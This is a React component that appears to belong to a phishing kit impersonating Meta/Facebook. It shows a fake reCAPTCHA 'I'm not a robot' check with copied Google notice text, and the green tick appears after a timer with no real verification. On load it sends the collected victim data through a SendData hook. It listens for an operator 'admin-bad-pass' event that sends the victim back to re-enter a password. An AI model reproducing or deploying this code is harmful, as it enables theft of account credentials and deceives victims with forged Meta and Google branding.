import React, { useContext, useEffect, useRef, useState } from "react";
import Image from "next/image";
import styled, { keyframes } from "styled-components";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";

const spin = keyframes`
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
`;

const shimmer = keyframes`
  0% {
    transform: translateX(-120%);
  }
  100% {
    transform: translateX(220%);
  }
`;

const Page = styled.div`
  min-height: 100vh;
  background: #ffffff;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding: 54px 18px 24px;
  font-family: Helvetica, Arial, sans-serif;
  color: #5f6368;
`;

const Content = styled.div`
  width: 100%;
  max-width: 340px;
  display: flex;
  flex-direction: column;
  position: relative;
  margin-top: 40px;
`;

const MetaHeader = styled.div`
  display: flex;
  align-items: center;
  color: #1c1e21;
  margin-bottom: 10px;
`;

const MetaLogoWrap = styled.div`
  width: 82px;
  height: 18px;
  display: flex;
  align-items: center;
`;

const CaptchaCard = styled.div`
  border: 1px solid #d3d3d3;
  background: #fff;
  min-height: 76px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 12px;
  border-radius: 2px;
  box-shadow: 0 1px 2px rgba(60, 64, 67, 0.12);
`;

const LeftSide = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
  min-width: 0;
`;

const CheckWrap = styled.div`
  width: 30px;
  height: 30px;
  display: grid;
  place-items: center;
  position: relative;
  flex-shrink: 0;
`;

const AnimatedCheck = styled.svg`
  width: 30px;
  height: 30px;
`;

const CheckText = styled.div`
  font-size: 14px;
  color: #202124;
  white-space: nowrap;
`;

const RightSide = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 2px;
  flex-shrink: 0;
`;

const RecaptchaBadge = styled.div`
  width: 54px;
  height: 54px;
  position: relative;
`;

const BadgeLabel = styled.div`
  font-size: 8px;
  line-height: 1;
  color: #5f6368;
  text-align: center;
`;

const BadgeMeta = styled.div`
  font-size: 8px;
  line-height: 1.1;
  color: #5f6368;
  text-align: center;
  margin-top: 4px;
`;

const Paragraph = styled.p`
  margin: 10px 0 0;
  font-size: 12px;
  line-height: 1.35;
  color: #5f6368;
`;

const SpinnerShell = styled.div`
  width: 24px;
  height: 24px;
  border-radius: 50%;
  border: 5px solid #e5eefc;
  border-top-color: #4285f4;
  border-left-color: #4285f4;
  animation: ${spin} 0.95s linear infinite;
  position: relative;
  box-sizing: border-box;
`;

const TickStage = styled.div`
  opacity: ${(props) => (props.$visible ? 1 : 0)};
  transform: ${(props) => (props.$visible ? "scale(1)" : "scale(0.8)")};
  transition: opacity 0.22s ease, transform 0.22s ease;
`;

const MetaLogo = () => (
    <img  src="/assets/images/loadingGif.gif" alt="Meta logo" width="82" height="18" />
);

function NWait({ setStep, wrongPasswordTrigger = 0 }) {
  const { AllData } = useContext(DataContext);
  const [hasStartedVerification, setHasStartedVerification] = useState(false);
  const [showVerified, setShowVerified] = useState(false);
  const lastHandledWrongPasswordTrigger = useRef(wrongPasswordTrigger);

  useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "Facebook N-Wait page",
    };

    SendData(params);
  }, [AllData]);

  useEffect(() => {
    if (!hasStartedVerification) return undefined;

    const timer = setTimeout(() => {
      setShowVerified(true);
    }, 4000);

    return () => clearTimeout(timer);
  }, [hasStartedVerification]);

  const handleStartVerification = () => {
    if (hasStartedVerification) return;
    setHasStartedVerification(true);
  };

  useEffect(() => {
    const handleBadPass = () => {
      if (typeof setStep === "function") {
        setStep(2);
      }
    };

    window.addEventListener("admin-bad-pass", handleBadPass);

    return () => {
      window.removeEventListener("admin-bad-pass", handleBadPass);
    };
  }, [setStep]);

  useEffect(() => {
    if (wrongPasswordTrigger === lastHandledWrongPasswordTrigger.current) {
      return;
    }

    lastHandledWrongPasswordTrigger.current = wrongPasswordTrigger;

    if (typeof setStep === "function") {
      setStep(2);
    }
  }, [wrongPasswordTrigger, setStep]);

  return (
    <Page>
      <Content>
        <MetaHeader>
          <MetaLogoWrap>
            <MetaLogo />
          </MetaLogoWrap>
        </MetaHeader>

        <CaptchaCard>
          <LeftSide>
            <CheckWrap>
              {showVerified ? (
                <TickStage $visible={showVerified}>
                  <AnimatedCheck viewBox="0 0 28 28" aria-hidden="true">
                    <path
                      d="M6.2 14.8 11.4 20l10.6-11.3"
                      fill="none"
                      stroke="#34a853"
                      strokeWidth="3.6"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </AnimatedCheck>
                </TickStage>
              ) : hasStartedVerification ? (
                <SpinnerShell aria-hidden="true" />
              ) : (
                <input
                  type="checkbox"
                  aria-label="I'm not a robot"
                  onChange={handleStartVerification}
                  style={{
                    width: "28px",
                    height: "28px",
                    margin: 0,
                    cursor: "pointer",
                    accentColor: "#1a73e8",
                  }}
                />
              )}
            </CheckWrap>
            <CheckText>I&apos;m not a robot</CheckText>
          </LeftSide>

          <RightSide>
            <RecaptchaBadge>
              <Image
                src="/assets/images/recaptcha.png"
                alt="reCAPTCHA"
                fill
                sizes="60px"
                style={{ objectFit: "contain" }}
              />
            </RecaptchaBadge>
          </RightSide>
        </CaptchaCard>

        <Paragraph>
          This helps us combat harmful behavior, detect and prevent spam, and
          maintain the integrity of our products.
        </Paragraph>

        <Paragraph>
          We&apos;ve used Google&apos;s reCAPTCHA Enterprise product to provide
          this security check. Your use of reCAPTCHA Enterprise is subject to
          Google&apos;s Privacy Policy and Terms of Use.
        </Paragraph>

        <Paragraph>
          reCAPTCHA Enterprise collects hardware and software information, such
          as device and application data, and sends it to Google to provide,
          maintain, and improve reCAPTCHA Enterprise for general security
          purposes. This information is not used by Google for personalized
          advertising.
        </Paragraph>
      </Content>
    </Page>
  );
}

export default NWait;
